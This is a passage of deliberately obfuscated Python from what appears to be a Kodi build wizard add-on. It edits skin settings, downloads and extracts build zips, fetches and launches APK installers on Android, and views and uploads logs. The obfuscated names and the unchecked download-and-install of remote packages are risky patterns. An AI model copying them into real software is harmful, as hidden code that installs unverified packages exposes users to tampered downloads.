			OO0O00OOOO0O00O00 =open (O0000OO0000O00000 ,'r')#line:4294
			O00O0OO000OOO000O =OO0O00OOOO0O00O00 .read ()#line:4295
			OO0O00OOOO0O00O00 .close ()#line:4296
			O000O0O00O00OO0O0 ='<setting id="show.clearlogo" type="bool(.+?)/setting>'#line:4297
			O0OOOO0OOO000O0O0 =re .compile (O000O0O00O00OO0O0 ).findall (O00O0OO000OOO000O )[0 ]#line:4298
			OO0O00OOOO0O00O00 =open (O0000OO0000O00000 ,'w')#line:4299
			OO0O00OOOO0O00O00 .write (O00O0OO000OOO000O .replace ('<setting id="show.clearlogo" type="bool%s/setting>'%O0OOOO0OOO000O0O0 ,'<setting id="show.clearlogo" type="bool">false</setting>'))#line:4300
			OO0O00OOOO0O00O00 .close ()#line:4301
			O0000OO0000O00000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4305
			OO0O00OOOO0O00O00 =open (O0000OO0000O00000 ,'r')#line:4307
			O00O0OO000OOO000O =OO0O00OOOO0O00O00 .read ()#line:4308
			OO0O00OOOO0O00O00 .close ()#line:4309
			O000O0O00O00OO0O0 ='<setting id="show.cdart" type="bool(.+?)/setting>'#line:4310
			O0OOOO0OOO000O0O0 =re .compile (O000O0O00O00OO0O0 ).findall (O00O0OO000OOO000O )[0 ]#line:4311
			OO0O00OOOO0O00O00 =open (O0000OO0000O00000 ,'w')#line:4312
			OO0O00OOOO0O00O00 .write (O00O0OO000OOO000O .replace ('<setting id="show.cdart" type="bool%s/setting>'%O0OOOO0OOO000O0O0 ,'<setting id="show.cdart" type="bool">false</setting>'))#line:4313
			OO0O00OOOO0O00O00 .close ()#line:4314
			O0000OO0000O00000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4318
			OO0O00OOOO0O00O00 =open (O0000OO0000O00000 ,'r')#line:4320
			O00O0OO000OOO000O =OO0O00OOOO0O00O00 .read ()#line:4321
			OO0O00OOOO0O00O00 .close ()#line:4322
			O000O0O00O00OO0O0 ='<setting id="furniture.showhublogo" type="bool(.+?)/setting>'#line:4323
			O0OOOO0OOO000O0O0 =re .compile (O000O0O00O00OO0O0 ).findall (O00O0OO000OOO000O )[0 ]#line:4324
			OO0O00OOOO0O00O00 =open (O0000OO0000O00000 ,'w')#line:4325
			OO0O00OOOO0O00O00 .write (O00O0OO000OOO000O .replace ('<setting id="furniture.showhublogo" type="bool%s/setting>'%O0OOOO0OOO000O0O0 ,'<setting id="furniture.showhublogo" type="bool">false</setting>'))#line:4326
			OO0O00OOOO0O00O00 .close ()#line:4327
		except :#line:4332
			pass #line:4333
def thirdPartyInstall (O0OOOOOOOO0O00000 ,O00OOO000O00OOOOO ):#line:4335
	if not wiz .workingURL (O00OOO000O00OOOOO ):#line:4336
		LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Invalid URL for Build[/COLOR]'%COLOR2 );return #line:4337
	O0O0O00OOOOO000O0 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to preform a [COLOR %s]Fresh Install[/COLOR] or [COLOR %s]Normal Install[/COLOR] for:[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O0OOOOOOOO0O00000 ),yeslabel ="[B][COLOR green]Fresh Install[/COLOR][/B]",nolabel ="[B][COLOR red]Normal Install[/COLOR][/B]")#line:4338
	if O0O0O00OOOOO000O0 ==1 :#line:4339
		freshStart ('third',True )#line:4340
	wiz .clearS ('build')#line:4341
	OOO0000O00O00O000 =O0OOOOOOOO0O00000 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4342
	if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4343
	DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0OOOOOOOO0O00000 ),'','אנא המתן')#line:4344
	O00O0OO0O0O0OO000 =os .path .join (PACKAGES ,'%s.zip'%OOO0000O00O00O000 )#line:4345
	try :os .remove (O00O0OO0O0O0OO000 )#line:4346
	except :pass #line:4347
	downloader .download (O00OOO000O00OOOOO ,O00O0OO0O0O0OO000 ,DP )#line:4348
	xbmc .sleep (1000 )#line:4349
	OO00OO0O0OO000OOO ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0OOOOOOOO0O00000 )#line:4350
	DP .update (0 ,OO00OO0O0OO000OOO ,'','אנא המתן')#line:4351
	O0O0OO0O000OOO000 ,OO000O000OO0O0O00 ,OO000OO0000O00O00 =extract .all (O00O0OO0O0O0OO000 ,HOME ,DP ,title =OO00OO0O0OO000OOO )#line:4352
	if int (float (O0O0OO0O000OOO000 ))>0 :#line:4353
		wiz .fixmetas ()#line:4354
		wiz .lookandFeelData ('save')#line:4355
		wiz .defaultSkin ()#line:4356
		wiz .setS ('installed','true')#line:4358
		wiz .setS ('extract',str (O0O0OO0O000OOO000 ))#line:4359
		wiz .setS ('errors',str (OO000O000OO0O0O00 ))#line:4360
		wiz .log ('INSTALLED %s: [ERRORS:%s]'%(O0O0OO0O000OOO000 ,OO000O000OO0O0O00 ))#line:4361
		try :os .remove (O00O0OO0O0O0OO000 )#line:4362
		except :pass #line:4363
		if int (float (OO000O000OO0O0O00 ))>0 :#line:4364
			O00O000OO00OOOOO0 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s][COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0OOOOOOOO0O00000 ),'Completed: [COLOR %s]%s%s[/COLOR] [Errors:[COLOR %s]%s[/COLOR]]'%(COLOR1 ,O0O0OO0O000OOO000 ,'%',COLOR1 ,OO000O000OO0O0O00 ),'האם תרצה להציג שגיאות?[/COLOR]',nolabel ='[B][COLOR red]לא תודה[/COLOR][/B]',yeslabel ='[B][COLOR green]הצג שגיאות[/COLOR][/B]')#line:4365
			if O00O000OO00OOOOO0 :#line:4366
				if isinstance (OO000O000OO0O0O00 ,unicode ):#line:4367
					OO000OO0000O00O00 =OO000OO0000O00O00 .encode ('utf-8')#line:4368
				wiz .TextBox (ADDONTITLE ,OO000OO0000O00O00 )#line:4369
	DP .close ()#line:4370
	if KODIV >=17 :wiz .addonDatabase (ADDON_ID ,1 )#line:4371
	if INSTALLMETHOD ==1 :OO00O0O0000O0OO00 =1 #line:4372
	elif INSTALLMETHOD ==2 :OO00O0O0000O0OO00 =0 #line:4373
	else :OO00O0O0000O0OO00 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to [COLOR %s]Force close[/COLOR] kodi or [COLOR %s]Reload Profile[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR green]Reload Profile[/COLOR][/B]",nolabel ="[B][COLOR red]Force Close[/COLOR][/B]")#line:4374
	if OO00O0O0000O0OO00 ==1 :wiz .reloadFix ()#line:4375
	else :wiz .killxbmc (True )#line:4376
def testTheme (OOO000O000O0000O0 ):#line:4378
	OOO0O0000OO0O00O0 =zipfile .ZipFile (OOO000O000O0000O0 )#line:4379
	for O0O00OOO0OO00OOO0 in OOO0O0000OO0O00O0 .infolist ():#line:4380
		if '/settings.xml'in O0O00OOO0OO00OOO0 .filename :#line:4381
			return True #line:4382
	return False #line:4383
def testGui (OO0OOOO0O000O0O00 ):#line:4385
	O000000O0OO0000O0 =zipfile .ZipFile (OO0OOOO0O000O0O00 )#line:4386
	for OOO0O0O00O0O0O000 in O000000O0OO0000O0 .infolist ():#line:4387
		if '/guisettings.xml'in OOO0O0O00O0O0O000 .filename :#line:4388
			return True #line:4389
	return False #line:4390
def apkInstaller (OOO00O0OOOO00O00O ,O00000O00OO0O0OO0 ):#line:4392
	wiz .log (OOO00O0OOOO00O00O )#line:4393
	wiz .log (O00000O00OO0O0OO0 )#line:4394
	if wiz .platform ()=='android':#line:4395
		OO00O0OOO0O000OOO =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]האם תרצה להוריד ולהתקין את:"%COLOR2 ,"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OOO00O0OOOO00O00O ),yeslabel ="[B][COLOR green]התקן[/COLOR][/B]",nolabel ="[B][COLOR red]ביטול[/COLOR][/B]")#line:4396
		if not OO00O0OOO0O000OOO :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ERROR: Install Cancelled[/COLOR]'%COLOR2 );return #line:4397
		O0OOO0O00O000OO00 =OOO00O0OOOO00O00O #line:4398
		if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4399
		if not wiz .workingURL (O00000O00OO0O0OO0 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]APK Installer: Invalid Apk Url![/COLOR]'%COLOR2 );return #line:4400
		DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0OOO0O00O000OO00 ),'','אנא המתן')#line:4401
		O00OO0O00000OOOOO =os .path .join (PACKAGES ,"%s.apk"%OOO00O0OOOO00O00O .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|',''))#line:4402
		try :os .remove (O00OO0O00000OOOOO )#line:4403
		except :pass #line:4404
		downloader .download (O00000O00OO0O0OO0 ,O00OO0O00000OOOOO ,DP )#line:4405
		xbmc .sleep (100 )#line:4406
		DP .close ()#line:4407
		notify .apkInstaller (OOO00O0OOOO00O00O )#line:4408
		wiz .ebi ('StartAndroidActivity("","android.intent.action.VIEW","application/vnd.android.package-archive","file:'+O00OO0O00000OOOOO +'")')#line:4409
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ERROR: None Android Device[/COLOR]'%COLOR2 )#line:4410
def createMenu (O00OO000O0OO0O0O0 ,O0OOOO00OOOO0000O ,OOOOO0OO0O0OO0O0O ):#line:4416
	if O00OO000O0OO0O0O0 =='saveaddon':#line:4417
		OOOOO0OOO000000OO =[]#line:4418
		O0OOO0OO0OOO0OO0O =urllib .quote_plus (O0OOOO00OOOO0000O .lower ().replace (' ',''))#line:4419
		O00OOO0OOO0OO0OOO =O0OOOO00OOOO0000O .replace ('Debrid','Real Debrid')#line:4420
		O00OOO0OOO00OOO00 =urllib .quote_plus (OOOOO0OO0O0OO0O0O .lower ().replace (' ',''))#line:4421
		OOOOO0OO0O0OO0O0O =OOOOO0OO0O0OO0O0O .replace ('url','URL Resolver')#line:4422
		OOOOO0OOO000000OO .append ((THEME2 %OOOOO0OO0O0OO0O0O .title (),' '))#line:4423
		OOOOO0OOO000000OO .append ((THEME3 %'Save %s Data'%O00OOO0OOO0OO0OOO ,'RunPlugin(plugin://%s/?mode=save%s&name=%s)'%(ADDON_ID ,O0OOO0OO0OOO0OO0O ,O00OOO0OOO00OOO00 )))#line:4424
		OOOOO0OOO000000OO .append ((THEME3 %'Restore %s Data'%O00OOO0OOO0OO0OOO ,'RunPlugin(plugin://%s/?mode=restore%s&name=%s)'%(ADDON_ID ,O0OOO0OO0OOO0OO0O ,O00OOO0OOO00OOO00 )))#line:4425
		OOOOO0OOO000000OO .append ((THEME3 %'Clear %s Data'%O00OOO0OOO0OO0OOO ,'RunPlugin(plugin://%s/?mode=clear%s&name=%s)'%(ADDON_ID ,O0OOO0OO0OOO0OO0O ,O00OOO0OOO00OOO00 )))#line:4426
	elif O00OO000O0OO0O0O0 =='save':#line:4427
		OOOOO0OOO000000OO =[]#line:4428
		O0OOO0OO0OOO0OO0O =urllib .quote_plus (O0OOOO00OOOO0000O .lower ().replace (' ',''))#line:4429
		O00OOO0OOO0OO0OOO =O0OOOO00OOOO0000O .replace ('Debrid','Real Debrid')#line:4430
		O00OOO0OOO00OOO00 =urllib .quote_plus (OOOOO0OO0O0OO0O0O .lower ().replace (' ',''))#line:4431
		OOOOO0OO0O0OO0O0O =OOOOO0OO0O0OO0O0O .replace ('url','URL Resolver')#line:4432
		OOOOO0OOO000000OO .append ((THEME2 %OOOOO0OO0O0OO0O0O .title (),' '))#line:4433
		OOOOO0OOO000000OO .append ((THEME3 %'Register %s'%O00OOO0OOO0OO0OOO ,'RunPlugin(plugin://%s/?mode=auth%s&name=%s)'%(ADDON_ID ,O0OOO0OO0OOO0OO0O ,O00OOO0OOO00OOO00 )))#line:4434
		OOOOO0OOO000000OO .append ((THEME3 %'Save %s Data'%O00OOO0OOO0OO0OOO ,'RunPlugin(plugin://%s/?mode=save%s&name=%s)'%(ADDON_ID ,O0OOO0OO0OOO0OO0O ,O00OOO0OOO00OOO00 )))#line:4435
		OOOOO0OOO000000OO .append ((THEME3 %'Restore %s Data'%O00OOO0OOO0OO0OOO ,'RunPlugin(plugin://%s/?mode=restore%s&name=%s)'%(ADDON_ID ,O0OOO0OO0OOO0OO0O ,O00OOO0OOO00OOO00 )))#line:4436
		OOOOO0OOO000000OO .append ((THEME3 %'Import %s Data'%O00OOO0OOO0OO0OOO ,'RunPlugin(plugin://%s/?mode=import%s&name=%s)'%(ADDON_ID ,O0OOO0OO0OOO0OO0O ,O00OOO0OOO00OOO00 )))#line:4437
		OOOOO0OOO000000OO .append ((THEME3 %'Clear Addon %s Data'%O00OOO0OOO0OO0OOO ,'RunPlugin(plugin://%s/?mode=addon%s&name=%s)'%(ADDON_ID ,O0OOO0OO0OOO0OO0O ,O00OOO0OOO00OOO00 )))#line:4438
	elif O00OO000O0OO0O0O0 =='install':#line:4439
		OOOOO0OOO000000OO =[]#line:4440
		O00OOO0OOO00OOO00 =urllib .quote_plus (OOOOO0OO0O0OO0O0O )#line:4441
		OOOOO0OOO000000OO .append ((THEME2 %OOOOO0OO0O0OO0O0O ,'RunAddon(%s, ?mode=viewbuild&name=%s)'%(ADDON_ID ,O00OOO0OOO00OOO00 )))#line:4442
		OOOOO0OOO000000OO .append ((THEME3 %'Fresh Install','RunPlugin(plugin://%s/?mode=install&name=%s&url=fresh)'%(ADDON_ID ,O00OOO0OOO00OOO00 )))#line:4443
		OOOOO0OOO000000OO .append ((THEME3 %'Normal Install','RunPlugin(plugin://%s/?mode=install&name=%s&url=normal)'%(ADDON_ID ,O00OOO0OOO00OOO00 )))#line:4444
		OOOOO0OOO000000OO .append ((THEME3 %'Apply guiFix','RunPlugin(plugin://%s/?mode=install&name=%s&url=gui)'%(ADDON_ID ,O00OOO0OOO00OOO00 )))#line:4445
		OOOOO0OOO000000OO .append ((THEME3 %'Build Information','RunPlugin(plugin://%s/?mode=buildinfo&name=%s)'%(ADDON_ID ,O00OOO0OOO00OOO00 )))#line:4446
	OOOOO0OOO000000OO .append ((THEME2 %'%s Settings'%ADDONTITLE ,'RunPlugin(plugin://%s/?mode=settings)'%ADDON_ID ))#line:4447
	return OOOOO0OOO000000OO #line:4448
def toggleCache (OOO0O0OOO00000000 ):#line:4450
	OO000O0000000000O =['includevideo','includeall','includebob','includephoenix','includespecto','includegenesis','includeexodus','includeonechan','includesalts','includesaltslite']#line:4451
	OOO0000OO0OO0O0OO =['Include Video Addons','Include All Addons','Include Bob','Include Phoenix','Include Specto','Include Genesis','Include Exodus','Include One Channel','Include Salts','Include Salts Lite HD']#line:4452
	if OOO0O0OOO00000000 in ['true','false']:#line:4453
		for O0O0000O0OOOOO0OO in OO000O0000000000O :#line:4454
			wiz .setS (O0O0000O0OOOOO0OO ,OOO0O0OOO00000000 )#line:4455
	else :#line:4456
		if not OOO0O0OOO00000000 in ['includevideo','includeall']and wiz .getS ('includeall')=='true':#line:4457
			try :#line:4458
				O0O0000O0OOOOO0OO =OOO0000OO0OO0O0OO [OO000O0000000000O .index (OOO0O0OOO00000000 )]#line:4459
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]You will need to turn off [COLOR %s]Include All Addons[/COLOR] to disable[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ,O0O0000O0OOOOO0OO ))#line:4460
			except :#line:4461
				wiz .LogNotify ("[COLOR %s]Toggle Cache[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid id: %s[/COLOR]"%(COLOR2 ,OOO0O0OOO00000000 ))#line:4462
		else :#line:4463
			O00O000O0O0OO0O0O ='true'if wiz .getS (OOO0O0OOO00000000 )=='false'else 'false'#line:4464
			wiz .setS (OOO0O0OOO00000000 ,O00O000O0O0OO0O0O )#line:4465
def playVideo (O00OO0OOO0000O000 ):#line:4467
	wiz .log ("YouTube CCCCCCCCCCCCCCCCCCCCCCCCCCC URL: %s"%O00OO0OOO0000O000 )#line:4468
	if 'watch?v='in O00OO0OOO0000O000 :#line:4469
		O0O0000O000O0O000 ,O0OOO00O000O00000 =O00OO0OOO0000O000 .split ('?')#line:4470
		OOO0OO0OO0OO000O0 =O0OOO00O000O00000 .split ('&')#line:4471
		for OOOO0O0OOO00O00OO in OOO0OO0OO0OO000O0 :#line:4472
			if OOOO0O0OOO00O00OO .startswith ('v='):#line:4473
				O00OO0OOO0000O000 =OOOO0O0OOO00O00OO [2 :]#line:4474
				break #line:4475
			else :continue #line:4476
	elif 'embed'in O00OO0OOO0000O000 or 'youtu.be'in O00OO0OOO0000O000 :#line:4477
		wiz .log ("YouTube BBBBBBBBBBBBBBBBBBBBBBBBB URL: %s"%O00OO0OOO0000O000 )#line:4478
		O0O0000O000O0O000 =O00OO0OOO0000O000 .split ('/')#line:4479
		if len (O0O0000O000O0O000 [-1 ])>5 :#line:4480
			O00OO0OOO0000O000 =O0O0000O000O0O000 [-1 ]#line:4481
		elif len (O0O0000O000O0O000 [-2 ])>5 :#line:4482
			O00OO0OOO0000O000 =O0O0000O000O0O000 [-2 ]#line:4483
	wiz .log ("YouTube URL: %s"%O00OO0OOO0000O000 )#line:4484
	yt .PlayVideo (O00OO0OOO0000O000 )#line:4485
def viewLogFile ():#line:4487
	OOOO00OO000OOO0O0 =wiz .Grab_Log (True )#line:4488
	O0OO000OOO00000OO =wiz .Grab_Log (True ,True )#line:4489
	OOO0O000OO0OOO0OO =0 ;O00OO00OOO00O00O0 =OOOO00OO000OOO0O0 #line:4490
	if not O0OO000OOO00000OO ==False and not OOOO00OO000OOO0O0 ==False :#line:4491
		OOO0O000OO0OOO0OO =DIALOG .select (ADDONTITLE ,["View %s"%OOOO00OO000OOO0O0 .replace (LOG ,""),"View %s"%O0OO000OOO00000OO .replace (LOG ,"")])#line:4492
		if OOO0O000OO0OOO0OO ==-1 :wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]View Log Cancelled![/COLOR]'%COLOR2 );return #line:4493
	elif OOOO00OO000OOO0O0 ==False and O0OO000OOO00000OO ==False :#line:4494
		wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]No Log File Found![/COLOR]'%COLOR2 )#line:4495
		return #line:4496
	elif not OOOO00OO000OOO0O0 ==False :OOO0O000OO0OOO0OO =0 #line:4497
	elif not O0OO000OOO00000OO ==False :OOO0O000OO0OOO0OO =1 #line:4498
	O00OO00OOO00O00O0 =OOOO00OO000OOO0O0 if OOO0O000OO0OOO0OO ==0 else O0OO000OOO00000OO #line:4500
	OO0OO00O0O00OO000 =wiz .Grab_Log (False )if OOO0O000OO0OOO0OO ==0 else wiz .Grab_Log (False ,True )#line:4501
	wiz .TextBox ("%s - %s"%(ADDONTITLE ,O00OO00OOO00O00O0 ),OO0OO00O0O00OO000 )#line:4503
def errorChecking (log =None ,count =None ,all =None ):#line:4505
	if log ==None :#line:4506
		O0000OOO0O0000000 =wiz .Grab_Log (True )#line:4507
		O0OO0O000O0OO00O0 =wiz .Grab_Log (True ,True )#line:4508
		if not O0OO0O000O0OO00O0 ==False and not O0000OOO0O0000000 ==False :#line:4509
			O000O0OOO0O0OOO00 =DIALOG .select (ADDONTITLE ,["View %s: %s error(s)"%(O0000OOO0O0000000 .replace (LOG ,""),errorChecking (O0000OOO0O0000000 ,True ,True )),"View %s: %s error(s)"%(O0OO0O000O0OO00O0 .replace (LOG ,""),errorChecking (O0OO0O000O0OO00O0 ,True ,True ))])#line:4510
			if O000O0OOO0O0OOO00 ==-1 :wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]View Log Cancelled![/COLOR]'%COLOR2 );return #line:4511
		elif O0000OOO0O0000000 ==False and O0OO0O000O0OO00O0 ==False :#line:4512
			wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]No Log File Found![/COLOR]'%COLOR2 )#line:4513
			return #line:4514
		elif not O0000OOO0O0000000 ==False :O000O0OOO0O0OOO00 =0 #line:4515
		elif not O0OO0O000O0OO00O0 ==False :O000O0OOO0O0OOO00 =1 #line:4516
		log =O0000OOO0O0000000 if O000O0OOO0O0OOO00 ==0 else O0OO0O000O0OO00O0 #line:4517
	if log ==False :#line:4518
		if count ==None :#line:4519
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Log File not Found[/COLOR]"%COLOR2 )#line:4520
			return False #line:4521
		else :#line:4522
			return 0 #line:4523
	else :#line:4524
		if os .path .exists (log ):#line:4525
			O00000O0O00OO0O00 =open (log ,mode ='r');OOO00OO00O0OOO000 =O00000O0O00OO0O00 .read ().replace ('\n','').replace ('\r','');O00000O0O00OO0O00 .close ()#line:4526
			O0O0OOO0O0O0OOO00 =re .compile ("-->Python callback/script returned the following error<--(.+?)-->End of Python script error report<--").findall (OOO00OO00O0OOO000 )#line:4527
			if not count ==None :#line:4528
				if all ==None :#line:4529
					O0000000O0000OOOO =0 #line:4530
					for OO000O0OOO0O0OOO0 in O0O0OOO0O0O0OOO00 :#line:4531
						if ADDON_ID in OO000O0OOO0O0OOO0 :O0000000O0000OOOO +=1 #line:4532
					return O0000000O0000OOOO #line:4533
				else :return len (O0O0OOO0O0O0OOO00 )#line:4534
			if len (O0O0OOO0O0O0OOO00 )>0 :#line:4535
				O0000000O0000OOOO =0 ;OO0OOOOOO00O0OOOO =""#line:4536
				for OO000O0OOO0O0OOO0 in O0O0OOO0O0O0OOO00 :#line:4537
					if all ==None and not ADDON_ID in OO000O0OOO0O0OOO0 :continue #line:4538
					else :#line:4539
						O0000000O0000OOOO +=1 #line:4540
						OO0OOOOOO00O0OOOO +="[COLOR red]Error Number %s[/COLOR]\n(PythonToCppException) : -->Python callback/script returned the following error<--%s-->End of Python script error report<--\n\n"%(O0000000O0000OOOO ,OO000O0OOO0O0OOO0 .replace ('                                          ','\n').replace ('\\\\','\\').replace (HOME ,''))#line:4541
				if O0000000O0000OOOO >0 :#line:4542
					wiz .TextBox (ADDONTITLE ,OO0OOOOOO00O0OOOO )#line:4543
				else :wiz .LogNotify (ADDONTITLE ,"No Errors Found in Log")#line:4544
			else :wiz .LogNotify (ADDONTITLE ,"No Errors Found in Log")#line:4545
		else :wiz .LogNotify (ADDONTITLE ,"Log File not Found")#line:4546
ACTION_PREVIOUS_MENU =10 #line:4548
ACTION_NAV_BACK =92 #line:4549
ACTION_MOVE_LEFT =1 #line:4550
ACTION_MOVE_RIGHT =2 #line:4551
ACTION_MOVE_UP =3 #line:4552
ACTION_MOVE_DOWN =4 #line:4553
ACTION_MOUSE_WHEEL_UP =104 #line:4554
ACTION_MOUSE_WHEEL_DOWN =105 #line:4555
ACTION_MOVE_MOUSE =107 #line:4556
ACTION_SELECT_ITEM =7 #line:4557
ACTION_BACKSPACE =110 #line:4558
ACTION_MOUSE_LEFT_CLICK =100 #line:4559
ACTION_MOUSE_LONG_CLICK =108 #line:4560
def LogViewer (default =None ):#line:4562
	class O0O0O00000O000000 (xbmcgui .WindowXMLDialog ):#line:4563
		def __init__ (OOOO00OO0OO0OOOOO ,*O0OO0O00O00OO0OO0 ,**OOO0OOO0000000000 ):#line:4564
			OOOO00OO0OO0OOOOO .default =OOO0OOO0000000000 ['default']#line:4565
		def onInit (O0O00O00O0000OO0O ):#line:4567
			O0O00O00O0000OO0O .title =101 #line:4568
			O0O00O00O0000OO0O .msg =102 #line:4569
			O0O00O00O0000OO0O .scrollbar =103 #line:4570
			O0O00O00O0000OO0O .upload =201 #line:4571
			O0O00O00O0000OO0O .kodi =202 #line:4572
			O0O00O00O0000OO0O .kodiold =203 #line:4573
			O0O00O00O0000OO0O .wizard =204 #line:4574
			O0O00O00O0000OO0O .okbutton =205 #line:4575
			OOOOOO00OO0OO0OOO =open (O0O00O00O0000OO0O .default ,'r')#line:4576
			O0O00O00O0000OO0O .logmsg =OOOOOO00OO0OO0OOO .read ()#line:4577
			OOOOOO00OO0OO0OOO .close ()#line:4578
			O0O00O00O0000OO0O .titlemsg ="%s: %s"%(ADDONTITLE ,O0O00O00O0000OO0O .default .replace (LOG ,'').replace (ADDONDATA ,''))#line:4579
			O0O00O00O0000OO0O .showdialog ()#line:4580
		def showdialog (OOO0O000OO00O0000 ):#line:4582
			OOO0O000OO00O0000 .getControl (OOO0O000OO00O0000 .title ).setLabel (OOO0O000OO00O0000 .titlemsg )#line:4583
			OOO0O000OO00O0000 .getControl (OOO0O000OO00O0000 .msg ).setText (wiz .highlightText (OOO0O000OO00O0000 .logmsg ))#line:4584
			OOO0O000OO00O0000 .setFocusId (OOO0O000OO00O0000 .scrollbar )#line:4585
		def onClick (OOO0O0OO0000O0O0O ,OO000O00OO0O0OO0O ):#line:4587
			if OO000O00OO0O0OO0O ==OOO0O0OO0000O0O0O .okbutton :OOO0O0OO0000O0O0O .close ()#line:4588
			elif OO000O00OO0O0OO0O ==OOO0O0OO0000O0O0O .upload :OOO0O0OO0000O0O0O .close ();uploadLog .Main ()#line:4589
			elif OO000O00OO0O0OO0O ==OOO0O0OO0000O0O0O .kodi :#line:4590
				OO0OO0OO00OO0OOOO =wiz .Grab_Log (False )#line:4591
				OO0OO00O00OOOOO0O =wiz .Grab_Log (True )#line:4592
				if OO0OO0OO00OO0OOOO ==False :#line:4593
					OOO0O0OO0000O0O0O .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4594
					OOO0O0OO0000O0O0O .getControl (OOO0O0OO0000O0O0O .msg ).setText ("Log File Does Not Exists!")#line:4595
				else :#line:4596
					OOO0O0OO0000O0O0O .titlemsg ="%s: %s"%(ADDONTITLE ,OO0OO00O00OOOOO0O .replace (LOG ,''))#line:4597
					OOO0O0OO0000O0O0O .getControl (OOO0O0OO0000O0O0O .title ).setLabel (OOO0O0OO0000O0O0O .titlemsg )#line:4598
					OOO0O0OO0000O0O0O .getControl (OOO0O0OO0000O0O0O .msg ).setText (wiz .highlightText (OO0OO0OO00OO0OOOO ))#line:4599
					OOO0O0OO0000O0O0O .setFocusId (OOO0O0OO0000O0O0O .scrollbar )#line:4600
			elif OO000O00OO0O0OO0O ==OOO0O0OO0000O0O0O .kodiold :#line:4601
				OO0OO0OO00OO0OOOO =wiz .Grab_Log (False ,True )#line:4602
				OO0OO00O00OOOOO0O =wiz .Grab_Log (True ,True )#line:4603
				if OO0OO0OO00OO0OOOO ==False :#line:4604
					OOO0O0OO0000O0O0O .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4605
					OOO0O0OO0000O0O0O .getControl (OOO0O0OO0000O0O0O .msg ).setText ("Log File Does Not Exists!")#line:4606
				else :#line:4607
					OOO0O0OO0000O0O0O .titlemsg ="%s: %s"%(ADDONTITLE ,OO0OO00O00OOOOO0O .replace (LOG ,''))#line:4608
					OOO0O0OO0000O0O0O .getControl (OOO0O0OO0000O0O0O .title ).setLabel (OOO0O0OO0000O0O0O .titlemsg )#line:4609
					OOO0O0OO0000O0O0O .getControl (OOO0O0OO0000O0O0O .msg ).setText (wiz .highlightText (OO0OO0OO00OO0OOOO ))#line:4610
					OOO0O0OO0000O0O0O .setFocusId (OOO0O0OO0000O0O0O .scrollbar )#line:4611
			elif OO000O00OO0O0OO0O ==OOO0O0OO0000O0O0O .wizard :#line:4612
				OO0OO0OO00OO0OOOO =wiz .Grab_Log (False ,False ,True )#line:4613
				OO0OO00O00OOOOO0O =wiz .Grab_Log (True ,False ,True )#line:4614
				if OO0OO0OO00OO0OOOO ==False :#line:4615
					OOO0O0OO0000O0O0O .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4616
					OOO0O0OO0000O0O0O .getControl (OOO0O0OO0000O0O0O .msg ).setText ("Log File Does Not Exists!")#line:4617
				else :#line:4618
					OOO0O0OO0000O0O0O .titlemsg ="%s: %s"%(ADDONTITLE ,OO0OO00O00OOOOO0O .replace (ADDONDATA ,''))#line:4619
					OOO0O0OO0000O0O0O .getControl (OOO0O0OO0000O0O0O .title ).setLabel (OOO0O0OO0000O0O0O .titlemsg )#line:4620
					OOO0O0OO0000O0O0O .getControl (OOO0O0OO0000O0O0O .msg ).setText (wiz .highlightText (OO0OO0OO00OO0OOOO ))#line:4621
					OOO0O0OO0000O0O0O .setFocusId (OOO0O0OO0000O0O0O .scrollbar )#line:4622
		def onAction (OOOOO000000OOOO0O ,OOO000000OO0OO000 ):#line:4624
			if OOO000000OO0OO000 ==ACTION_PREVIOUS_MENU :OOOOO000000OOOO0O .close ()#line:4625
			elif OOO000000OO0OO000 ==ACTION_NAV_BACK :OOOOO000000OOOO0O .close ()#line:4626
	if default ==None :default =wiz .Grab_Log (True )#line:4627
